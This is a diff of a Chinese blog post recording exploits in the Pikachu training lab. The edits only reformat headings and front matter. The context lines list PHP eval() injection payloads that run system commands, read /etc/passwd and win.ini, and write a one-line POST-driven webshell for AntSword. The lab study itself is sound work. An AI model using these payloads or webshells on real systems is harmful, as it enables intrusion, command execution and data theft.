@@ -1,8 +1,16 @@
 ---
-title: "Pikachu 靶场复现（二）：越权 / RCE / XXE"
-date: 2026-08-23 00:00:00 +0800
-categories: [漏洞复现, Web安全]
-tags: [Pikachu, 越权, IDOR, RCE, XXE]
+title: Pikachu 靶场复现（二）：越权 / RCE / XXE
+date: 2026-08-21 10:00:00 +0800
+categories:
+  - 靶场
+  - Web安全
+  - 漏洞复现
+tags:
+  - Pikachu
+  - 越权
+  - IDOR
+  - RCE
+  - XXE
 ---
 
 本篇汇总 Pikachu 靶场中越权（水平/垂直）、RCE、XXE 三类漏洞的复现过程，按漏洞类型分节记录。
@@ -45,7 +53,7 @@ payload：phpinfo();
 ![pasted image 20260820164927](/assets/img/posts/2026-08-23-pikachu-idor-rce-xxe/pasted-image-20260820164927.png)
 
 这里汇总一下eval() 里面能写哪些php代码
-## 1、输出查看类（回显，快速测试）
+### 1、输出查看类（回显，快速测试）
 
 ```
 phpinfo();                     //查看PHP环境信息
@@ -54,7 +62,7 @@ var_dump($_SERVER);            //打印服务器全部环境变量
 print_r(get_defined_constants(true));  //打印PHP常量
 ```
 
-## 2、执行操作系统命令（PHP调用系统shell）
+### 2、执行操作系统命令（PHP调用系统shell）
 使用PHP的`system()` / `shell_exec()`等函数调用系统命令，Windows用ipconfig，Linux用whoami。
 
 ```
@@ -64,7 +72,7 @@ echo shell_exec("ipconfig");   //shell_exec把结果返回，需要echo打印
 passthru("ipconfig");          //直接输出命令原始输出
 ```
 
-## 3、文件读取（读服务器文件）
+### 3、文件读取（读服务器文件）
 
 ```
 echo file_get_contents("C:/Windows/win.ini");   //Windows读文件
@@ -72,7 +80,7 @@ echo file_get_contents("/etc/passwd");          //Linux读账号文件
 readfile("C:/Windows/win.ini");
 ```
 
-## 4、写文件（生成一句话木马，靶场最常用）
+### 4、写文件（生成一句话木马，靶场最常用）
 
 fputs写法
 
@@ -88,13 +96,13 @@ file_put_contents("shell2.php",'<?php @eval($_POST["a"]);?>');
 ```
 
 执行后网站目录生成shell.php，蚁剑连接，密码`a`。
-## 5、多语句同时执行，用分号隔开
+### 5、多语句同时执行，用分号隔开
 
 ```
 phpinfo();system("ipconfig");
 ```
 
-## 6、其他常用
+### 6、其他常用
 
 ```
 highlight_file(__FILE__);   //查看当前PHP源码，这句payload在这里用不了，但我还是写在这里了
